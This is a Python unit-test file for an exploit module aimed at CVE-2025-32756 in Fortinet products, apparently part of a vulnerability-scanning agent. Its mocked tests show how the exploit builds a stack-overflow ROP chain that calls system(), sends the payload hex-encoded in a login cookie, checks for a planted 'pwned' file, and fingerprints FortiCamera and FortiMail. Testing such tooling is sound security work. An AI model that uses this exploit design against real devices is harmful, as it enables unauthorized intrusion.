"""Unit tests for Agent Asteroid: CVE-2025-32756"""

import logging
import struct
from unittest import mock
import typing

import pytest
import requests

from agent import definitions
from agent.exploits import cve_2025_32756


# Helper to setup a basic pwn mock for exploit instantiation and basic operations
def _get_mock_pwn_module() -> mock.MagicMock:
    """Creates a mock pwn module object with necessary attributes for exploit initialization and basic functions."""
    mock_pwn = mock.MagicMock()
    mock_pwn.context = mock.MagicMock()
    mock_pwn.context.arch = cve_2025_32756.TARGET_ARCHITECTURE
    mock_pwn.context.endian = cve_2025_32756.TARGET_ENDIANNESS
    if cve_2025_32756.TARGET_ARCHITECTURE in ["amd64", "aarch64"]:
        mock_pwn.context.bits = 64
    elif cve_2025_32756.TARGET_ARCHITECTURE in ["i386", "arm"]:
        mock_pwn.context.bits = 32
    else:
        mock_pwn.context.bits = (
            64 if cve_2025_32756.TARGET_ARCHITECTURE == "amd64" else 32
        )
    mock_pwn.p64 = mock.MagicMock(side_effect=lambda x: struct.pack("<Q", x))
    mock_pwn.p32 = mock.MagicMock(side_effect=lambda x: struct.pack("<I", x))
    mock_pwn.pwnlib = mock.MagicMock()
    mock_pwn.pwnlib.exception = mock.MagicMock()
    mock_pwn.pwnlib.exception.PwnlibException = type(
        "PwnlibException", (Exception,), {}
    )
    return mock_pwn


@pytest.fixture
def exploit_instance() -> cve_2025_32756.FortinetCVE202532756Exploit:
    """Fixture to create an exploit instance with pwn mocked."""
    with mock.patch("agent.exploits.cve_2025_32756.pwn", _get_mock_pwn_module()):
        instance = cve_2025_32756.FortinetCVE202532756Exploit()
    return instance


# --- Tests for __init__ ---
def testExploitInit_whenPwnImportFails_raisesImportError() -> None:
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        with pytest.raises(ImportError, match="Pwntools could not be imported"):
            cve_2025_32756.FortinetCVE202532756Exploit()


def testExploitInit_unsupportedArchPointerSize_raisesValueError() -> None:
    mock_pwn_obj = _get_mock_pwn_module()
    mock_pwn_obj.context.bits = 128  # Invalid bits value

    original_target_arch = cve_2025_32756.TARGET_ARCHITECTURE
    cve_2025_32756.TARGET_ARCHITECTURE = (
        "unknown_arch_for_test"  # This will be set to pwn.context.arch
    )

    try:
        with mock.patch("agent.exploits.cve_2025_32756.pwn", mock_pwn_obj):
            with pytest.raises(
                ValueError,
                match="Could not determine pointer size for Pwntools arch: unknown_arch_for_test",
            ):
                cve_2025_32756.FortinetCVE202532756Exploit()
    finally:
        cve_2025_32756.TARGET_ARCHITECTURE = original_target_arch


# --- Tests for _pack_address ---
def testPackAddress_amd64(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    addr = 0x4142434445464748
    packed = exploit_instance._pack_address(addr)
    assert packed == b"\x48\x47\x46\x45\x44\x43\x42\x41"


def testPackAddress_i386(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 4
    addr = 0x41424344
    packed = exploit_instance._pack_address(addr)
    assert packed == b"\x44\x43\x42\x41"


def testPackAddress_wrongType_raisesTypeError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    with pytest.raises(TypeError, match="Address must be int, got <class 'str'>"):
        exploit_instance._pack_address("not_an_int")  # type: ignore


def testPackAddress_pwnNone_raisesRuntimeError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    with mock.patch("agent.exploits.cve_2025_32756.pwn", None):
        with pytest.raises(RuntimeError, match="Pwntools not available for packing."):
            exploit_instance._pack_address(0x123)


def testPackAddress_unsupportedPointerSize_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 16
    with pytest.raises(
        ValueError, match="Unsupported pointer size for Pwntools packing: 16"
    ):
        exploit_instance._pack_address(0x123)


def testPackAddress_pwnPackingFails_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    mock_pwn_instance = _get_mock_pwn_module()
    PwnlibException = type("PwnlibException", (Exception,), {})
    mock_pwn_instance.pwnlib.exception.PwnlibException = PwnlibException
    mock_pwn_instance.p64.side_effect = PwnlibException("Packing failed")
    with mock.patch("agent.exploits.cve_2025_32756.pwn", mock_pwn_instance):
        with pytest.raises(ValueError, match="Pwntools packing failed for 0x123"):
            exploit_instance._pack_address(0x123)


# --- Tests for _generate_safe_random_padding ---
def testGenerateSafeRandomPadding_nNegative(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    assert exploit_instance._generate_safe_random_padding(-5) == b"\xff" * 5


def testGenerateSafeRandomPadding_nZero(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    assert exploit_instance._generate_safe_random_padding(0) == b""


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_noBadChars(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    mock_token_bytes.return_value = b"\x01\x02\x03\x04\x05"
    exploit_instance.bad_chars_set = set()
    padding = exploit_instance._generate_safe_random_padding(5)
    assert padding == b"\x01\x02\x03\x04\x05"
    mock_token_bytes.assert_called_once_with(5)


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_withBadChars(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = {0x0A, 0x0D}
    mock_token_bytes.side_effect = [
        b"\x0a",
        b"\x01",
        b"\x0d",
        b"\x02",
        b"\x03",
        b"\x04",
        b"\x05",
    ] * 20
    padding = exploit_instance._generate_safe_random_padding(3)
    assert len(padding) == 3
    for byte_val in padding:
        assert byte_val not in exploit_instance.bad_chars_set
    assert mock_token_bytes.call_count >= 3


def testGenerateSafeRandomPadding_allBadChars_raisesValueError(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = set(range(256))
    with pytest.raises(ValueError, match="All bytes forbidden for padding."):
        exploit_instance._generate_safe_random_padding(5)


@mock.patch("secrets.token_bytes")
def testGenerateSafeRandomPadding_generationFails_raisesValueError(
    mock_token_bytes: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.bad_chars_set = {0x01}
    mock_token_bytes.return_value = b"\x01"
    with pytest.raises(
        ValueError, match="Padding gen failed: got 0/5 bytes."
    ):  # Updated expected message
        exploit_instance._generate_safe_random_padding(5)


# --- Tests for _update_dependent_addresses ---
def testUpdateDependentAddresses_populatesGadgetsAndAddresses(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_flat_gadgets = cve_2025_32756.ROP_FLAT_GADGETS.copy()
    original_module_gadgets = cve_2025_32756.ROP_MODULE_GADGET_OFFSETS.copy()
    original_module_offsets = cve_2025_32756.ADDR_MODULE_OFFSETS.copy()
    cve_2025_32756.ROP_FLAT_GADGETS = {"flat_pop_rax": 0x1000}
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = {"target_binary": {"mod_pop_rbx": 0x200}}
    cve_2025_32756.ADDR_MODULE_OFFSETS = {"libc": {"puts": 0xABC}}
    exploit_instance.base_addresses = {
        "target_binary": 0x400000,
        "libc": 0x700000,
        "input_buffer_base": 0,
    }
    exploit_instance._update_dependent_addresses()
    assert exploit_instance.all_gadgets["flat_pop_rax"] == 0x1000
    assert exploit_instance.all_gadgets["target_binary_mod_pop_rbx"] == 0x400000 + 0x200
    assert exploit_instance.all_addresses["libc_puts"] == 0x700000 + 0xABC
    caplog.clear()
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = {"missing_module": {"gadget": 0x300}}
    exploit_instance._update_dependent_addresses()
    assert "Base for module 'missing_module' not found for gadgets." in caplog.text
    caplog.clear()
    cve_2025_32756.ADDR_MODULE_OFFSETS = {"missing_module2": {"symbol": 0x400}}
    exploit_instance._update_dependent_addresses()
    assert "Base for module 'missing_module2' not found for symbols." in caplog.text
    cve_2025_32756.ROP_FLAT_GADGETS = original_flat_gadgets
    cve_2025_32756.ROP_MODULE_GADGET_OFFSETS = original_module_gadgets
    cve_2025_32756.ADDR_MODULE_OFFSETS = original_module_offsets


# --- Tests for _build_exploit_code ---
def testBuildExploitCode_success(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit_instance.pointer_size = 8
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x401000}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x7F000050000
    }
    cve_2025_32756.ROP_COMMAND_VERIFICATION = "echo pwned"
    code = exploit_instance._build_exploit_code()
    assert code is not None
    packed_pop_rdi = struct.pack("<Q", 0x401000)
    packed_system = struct.pack("<Q", 0x7F000050000)
    cmd_bytes = b"echo pwned\0"
    placeholder = cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8]
    expected_code = packed_pop_rdi + placeholder + packed_system + cmd_bytes
    assert code == expected_code
    assert exploit_instance.rop_cmd_addr_placeholder_offset == len(packed_pop_rdi)


def testBuildExploitCode_missingPopRdi_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x12345
    }
    assert exploit_instance._build_exploit_code() is None
    assert "ROP build: Missing pop_rdi_ret gadget." in caplog.text


def testBuildExploitCode_missingSystem_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x123}
    exploit_instance.all_addresses = {}
    assert exploit_instance._build_exploit_code() is None
    assert (
        "ROP build: Missing 'libc_system' address." in caplog.text
    )  # Updated expected message


def testBuildExploitCode_packAddressFails_returnsNone(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit_instance.all_gadgets = {"pop_rdi_ret": 0x401000}
    exploit_instance.all_addresses = {
        cve_2025_32756._addr_key("libc", "system"): 0x7F000050000
    }
    with mock.patch.object(
        exploit_instance, "_pack_address", side_effect=ValueError("Pack fail")
    ):
        assert exploit_instance._build_exploit_code() is None
    assert "ROP build error: Pack fail" in caplog.text  # Updated expected message


# --- Tests for _craft_exploit_payload ---
@pytest.fixture
def configured_exploit_for_crafting(
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> typing.Generator[cve_2025_32756.FortinetCVE202532756Exploit, None, None]:
    exploit = exploit_instance
    exploit.pointer_size = 8
    exploit.base_addresses = {
        "input_buffer_base": cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE,
        "target_binary": cve_2025_32756.ADDR_FIXED_TARGET_BINARY_BASE,
        "libc": cve_2025_32756.ADDR_FIXED_LIBC_BASE,
    }
    exploit.rop_cmd_addr_placeholder_offset = 8
    orig_stack_buffer_offset = cve_2025_32756.STACK_BUFFER_OFFSET
    orig_stack_buffer_size = cve_2025_32756.STACK_BUFFER_SIZE
    orig_stack_canary_offset = cve_2025_32756.STACK_CANARY_OFFSET
    orig_stack_saved_rbp_offset = cve_2025_32756.STACK_SAVED_RBP_OFFSET
    orig_stack_return_address_overwrite_offset = (
        cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET
    )
    orig_stealth_random_padding_size = cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE
    cve_2025_32756.STACK_BUFFER_OFFSET = 64
    cve_2025_32756.STACK_BUFFER_SIZE = 256
    cve_2025_32756.STACK_CANARY_OFFSET = 0
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = 328
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 336
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = 0
    exploit.bad_chars_set = {
        int(b_val, 16) for b_val in cve_2025_32756.PAYLOAD_BAD_CHARS_HEX
    }
    yield exploit
    cve_2025_32756.STACK_BUFFER_OFFSET = orig_stack_buffer_offset
    cve_2025_32756.STACK_BUFFER_SIZE = orig_stack_buffer_size
    cve_2025_32756.STACK_CANARY_OFFSET = orig_stack_canary_offset
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = orig_stack_saved_rbp_offset
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = (
        orig_stack_return_address_overwrite_offset
    )
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = orig_stealth_random_padding_size


def testCraftExploitPayload_unpatchedCodeNone_returnsNone(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert configured_exploit_for_crafting._craft_exploit_payload(None) is None
    assert "Unpatched code is None. Cannot craft payload." in caplog.text


def testCraftExploitPayload_negativePaddingBeforeOw_returnsNone(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 10
    unpatched_code = b"ROP_STUFF" + (b"A" * 20)
    assert (
        configured_exploit_for_crafting._craft_exploit_payload(unpatched_code) is None
    )
    assert (
        "Calculated padding_before_overwrite_block is negative (-326). Check STACK_*_OFFSET and STACK_BUFFER_SIZE constants."
        in caplog.text
    )  # Updated expected message


@mock.patch("agent.exploits.cve_2025_32756.secrets.token_bytes", return_value=b"S")
def testCraftExploitPayload_successBasic(
    mock_secrets: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    exploit.rop_cmd_addr_placeholder_offset = 8
    unpatched_rop_gadgets = (
        b"B" * 8 + cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8] + b"C" * 8
    )
    cmd_str = b"my_cmd\0"
    unpatched_code = unpatched_rop_gadgets + cmd_str
    rbp_s = exploit.pointer_size
    overwrite_block_s = rbp_s + exploit.pointer_size
    padding_before_ow = (
        cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET
        - overwrite_block_s
        - (cve_2025_32756.STACK_BUFFER_OFFSET + cve_2025_32756.STACK_BUFFER_SIZE)
    )
    assert padding_before_ow == 0
    exploit_code_start_off = (
        cve_2025_32756.STACK_BUFFER_OFFSET
        + cve_2025_32756.STACK_BUFFER_SIZE
        + padding_before_ow
        + overwrite_block_s
        + cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE
    )
    exploit_code_live_ad = (
        exploit.base_addresses["input_buffer_base"] + exploit_code_start_off
    )
    live_cmd_str_ad = exploit_code_live_ad + len(unpatched_rop_gadgets)
    payload = exploit._craft_exploit_payload(unpatched_code)
    assert payload is not None
    expected_prefix = bytearray()
    expected_prefix.extend(b"A" * cve_2025_32756.STACK_BUFFER_OFFSET)
    expected_prefix.extend(b"A" * cve_2025_32756.STACK_BUFFER_SIZE)
    expected_prefix.extend(b"R" * rbp_s)
    expected_prefix.extend(exploit._pack_address(exploit_code_live_ad))
    patched_rop_code_arr = bytearray(unpatched_rop_gadgets)
    packed_cmd_ad = exploit._pack_address(live_cmd_str_ad)
    p_start = exploit.rop_cmd_addr_placeholder_offset
    patched_rop_code_arr[p_start : p_start + exploit.pointer_size] = packed_cmd_ad
    final_rop_code_section = bytes(patched_rop_code_arr) + cmd_str
    expected_payload = bytes(expected_prefix) + final_rop_code_section
    assert payload == expected_payload


def testCraftExploitPayload_badCharInPrefix_returnsNoneAndLogsError(  # Renamed for clarity
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    exploit = configured_exploit_for_crafting
    exploit.bad_chars_set = {0xBB}

    original_addr_fixed_input_buffer_base = cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE
    rop_chain_start_offset_in_buffer = 336

    cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE = (
        0x41424344454647BB - rop_chain_start_offset_in_buffer
    )
    exploit.base_addresses["input_buffer_base"] = (
        cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE
    )
    unpatched_code = b"X" * 30

    # Set caplog level to capture ERROR messages
    caplog.set_level(logging.ERROR)
    try:
        result = exploit._craft_exploit_payload(unpatched_code)

        assert result is None, (
            "_craft_exploit_payload should return None when bad chars are found"
        )

        # Check for the specific log message from the except block in _craft_exploit_payload
        found_log = False
        for record in caplog.records:
            if (
                record.levelname == "ERROR"
                and "Payload crafting error:" in record.message
                and "BadCharsDBG in prefix" in record.message
            ):
                if (
                    "byte 0xbb at payload_offset" in record.message
                ):  # More specific check within the logged error
                    found_log = True
                    break
        assert found_log, (
            "Expected ERROR log for bad character in payload not found or message incorrect"
        )

    finally:
        cve_2025_32756.ADDR_FIXED_INPUT_BUFFER_BASE = (
            original_addr_fixed_input_buffer_base
        )
        exploit.base_addresses["input_buffer_base"] = (
            original_addr_fixed_input_buffer_base
        )


def testCraftExploitPayload_withCanaryAndStealthPadding(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    cve_2025_32756.STACK_BUFFER_SIZE = 248
    cve_2025_32756.STACK_CANARY_OFFSET = 320
    cve_2025_32756.STACK_SAVED_RBP_OFFSET = 328
    cve_2025_32756.STACK_RETURN_ADDRESS_OVERWRITE_OFFSET = 336
    cve_2025_32756.STEALTH_RANDOM_PADDING_SIZE = 5
    exploit.rop_cmd_addr_placeholder_offset = 8
    unpatched_code = (
        b"B" * 8 + cve_2025_32756.ADDRESS_PLACEHOLDER_BYTES[:8] + b"C" * 8 + b"cmd\0"
    )
    with mock.patch.object(
        exploit, "_generate_safe_random_padding", return_value=b"S" * 5
    ) as mock_gen_pad:
        payload = exploit._craft_exploit_payload(unpatched_code)
    assert payload is not None
    mock_gen_pad.assert_called_once_with(5)
    assert b"\xcc" * 8 in payload
    assert b"S" * 5 in payload


# --- Tests for _trigger_vulnerability ---
@mock.patch("requests.Session.request")
def testTriggerVulnerability_success(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    payload = b"\x41\x42\x43"
    host, port = "testhost", 8080
    orig_trigger_payload_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    orig_trigger_cookie_name = cve_2025_32756.TRIGGER_COOKIE_NAME
    orig_target_vulnerable_path = cve_2025_32756.TARGET_VULNERABLE_PATH
    orig_timing_request_timeout = cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    cve_2025_32756.TRIGGER_COOKIE_NAME = "SESS"
    cve_2025_32756.TARGET_VULNERABLE_PATH = "/login"
    cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS = 5
    try:
        assert exploit._trigger_vulnerability(payload, host, port) is True
        mock_http_request.assert_called_once()
        _args, kwargs = mock_http_request.call_args
        assert kwargs["method"] == "GET"
        assert kwargs["url"] == "http://testhost:8080/login"  # Corrected expected URL
        assert kwargs["cookies"] == {"SESS": payload.hex()}
        assert kwargs["timeout"] == 5
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = orig_trigger_payload_location
        cve_2025_32756.TRIGGER_COOKIE_NAME = orig_trigger_cookie_name
        cve_2025_32756.TARGET_VULNERABLE_PATH = orig_target_vulnerable_path
        cve_2025_32756.TIMING_REQUEST_TIMEOUT_SECONDS = orig_timing_request_timeout


def testTriggerVulnerability_payloadNone_returnsFalse(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert (
        configured_exploit_for_crafting._trigger_vulnerability(None, "h", 80) is False
    )
    assert "Payload is None. Cannot trigger." in caplog.text


def testTriggerVulnerability_unsupportedLocation_returnsFalse(
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "unsupported"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is False
        )
        assert (
            "Unsupported trigger payload location: unsupported" in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location


@mock.patch("requests.Session.request", side_effect=requests.exceptions.Timeout)
def testTriggerVulnerability_timeout_returnsTrue(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    cve_2025_32756.TARGET_VULNERABLE_PATH = "/test_path"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is True
        )
        assert (
            "Trigger request to http://h:80/test_path timed out (potentially expected)."
            in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location
        cve_2025_32756.TARGET_VULNERABLE_PATH = "/remote/login"  # Restore default


@mock.patch(
    "requests.Session.request",
    side_effect=requests.exceptions.ConnectionError("ConnFail"),
)
def testTriggerVulnerability_requestException_returnsFalse(
    mock_http_request: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    original_location = cve_2025_32756.TRIGGER_PAYLOAD_LOCATION
    cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = "cookie_hex"
    cve_2025_32756.TARGET_VULNERABLE_PATH = "/test_path"
    try:
        assert (
            configured_exploit_for_crafting._trigger_vulnerability(b"p", "h", 80)
            is False
        )
        assert (
            "Trigger request to http://h:80/test_path failed: ConnFail" in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.TRIGGER_PAYLOAD_LOCATION = original_location
        cve_2025_32756.TARGET_VULNERABLE_PATH = "/remote/login"  # Restore default


# --- Tests for _verify_exploit_success ---
@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_success(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    exploit = configured_exploit_for_crafting
    host, port = "testhost", 80
    orig_target_use_https = cve_2025_32756.TARGET_USE_HTTPS
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    orig_ver_content = cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT
    orig_ver_timeout = cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS
    orig_post_trigger_delay = cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS
    cve_2025_32756.TARGET_USE_HTTPS = False
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/pwned.txt"
    cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = "PWNED_CONTENT"
    cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS = 3
    cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS = 1
    mock_response = mock.Mock()
    mock_response.status_code = 200
    mock_response.content = b"Some stuff PWNED_CONTENT more stuff"
    mock_http_get.return_value = mock_response
    try:
        assert exploit._verify_exploit_success(host, port) is True
        mock_sleep.assert_called_once_with(1)
        mock_http_get.assert_called_once_with(
            f"http://{host}:{port}/pwned.txt", timeout=3, allow_redirects=True
        )
    finally:
        cve_2025_32756.TARGET_USE_HTTPS = orig_target_use_https
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path
        cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = orig_ver_content
        cve_2025_32756.VERIFICATION_TIMEOUT_SECONDS = orig_ver_timeout
        cve_2025_32756.TIMING_POST_TRIGGER_DELAY_SECONDS = orig_post_trigger_delay


@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_failStatus(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    exploit = configured_exploit_for_crafting
    mock_response = mock.Mock()
    mock_response.status_code = 404
    mock_response.content = b""
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/file.txt"
    mock_http_get.return_value = mock_response
    try:
        assert exploit._verify_exploit_success("h", 80) is False
        assert (
            "Verification failed for http://h:80/file.txt: Status 404. Expected content 'CVE_2025_32756_PWNED' not found."
            in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


@mock.patch("time.sleep", return_value=None)
@mock.patch("requests.Session.get")
def testVerifyExploitSuccess_failContent(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    exploit = configured_exploit_for_crafting
    mock_response = mock.Mock()
    mock_response.status_code = 200
    mock_response.content = b"WRONG_CONTENT"
    orig_ver_content = cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = "EXPECTED"
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/file.txt"
    mock_http_get.return_value = mock_response
    try:
        assert exploit._verify_exploit_success("h", 80) is False
        assert (
            "Verification failed for http://h:80/file.txt: Status 200. Expected content 'EXPECTED' not found."
            in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.VERIFICATION_HTTP_EXPECTED_CONTENT = orig_ver_content
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


@mock.patch("time.sleep", return_value=None)
@mock.patch(
    "requests.Session.get",
    side_effect=requests.exceptions.RequestException("HTTP Boom"),
)
def testVerifyExploitSuccess_requestException(
    mock_http_get: mock.Mock,
    mock_sleep: mock.Mock,
    configured_exploit_for_crafting: cve_2025_32756.FortinetCVE202532756Exploit,
    caplog: pytest.LogCaptureFixture,
) -> None:
    caplog.set_level(logging.DEBUG)
    orig_ver_path = cve_2025_32756.VERIFICATION_HTTP_FILE_PATH
    cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = "/the/path.txt"
    try:
        assert configured_exploit_for_crafting._verify_exploit_success("h", 80) is False
        assert (
            "Verification HTTP request for 'http://h:80/the/path.txt' failed: HTTP Boom"
            in caplog.text
        )  # Updated expected message
    finally:
        cve_2025_32756.VERIFICATION_HTTP_FILE_PATH = orig_ver_path


# --- Tests for accept() method ---
@mock.patch("requests.Session.head")  # Mock head for FortiCamera check
@mock.patch("requests.Session.get")  # Mock get for content checks
def testAccept_fortiCameraByHeader(
    mock_get: mock.Mock,
    mock_head: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    mock_head_response = mock.Mock()
    mock_head_response.headers = {"www-authenticate": 'Basic realm="FortiCamera"'}
    mock_head.return_value = mock_head_response

    assert exploit_instance.accept(target) is True
    mock_head.assert_called_once_with(
        "http://localhost:80/", timeout=mock.ANY, allow_redirects=False
    )
    mock_get.assert_not_called()  # Should not proceed to GET if header matches


@mock.patch("requests.Session.head")
@mock.patch("requests.Session.get")
def testAccept_fortiMailByContent(
    mock_get: mock.Mock,
    mock_head: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    # Simulate FortiCamera header check failing or not matching
    mock_head.side_effect = requests.exceptions.RequestException("HEAD failed")

    mock_get_response = mock.Mock()
    mock_get_response.status_code = 200
    mock_get_response.text = "<title>Login - FortiMail</title>"
    mock_get_response.content = b"<title>Login - FortiMail</title>"
    # Let's assume the first path checked is /user/login for FortiMail
    mock_get.return_value = mock_get_response

    assert exploit_instance.accept(target) is True
    mock_head.assert_called_once()
    mock_get.assert_any_call(
        "http://localhost:80/user/login", timeout=mock.ANY, allow_redirects=True
    )


@mock.patch("requests.Session.head")
@mock.patch("requests.Session.get")
def testAccept_noIndicators(
    mock_get: mock.Mock,
    mock_head: mock.Mock,
    exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit,
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    mock_head.side_effect = requests.exceptions.RequestException(
        "HEAD failed"
    )  # No FortiCamera header

    mock_get_response = mock.Mock()
    mock_get_response.status_code = 200
    mock_get_response.text = "Some other web page"
    mock_get_response.content = b"Some other web page"
    mock_get.return_value = mock_get_response  # All GETs return non-Fortinet content

    assert exploit_instance.accept(target) is False
    mock_head.assert_called_once()
    # It should try all paths in FORTINET_ACCEPT_PATHS
    assert mock_get.call_count == len(cve_2025_32756.FORTINET_ACCEPT_PATHS)


# --- Tests for check() method ---
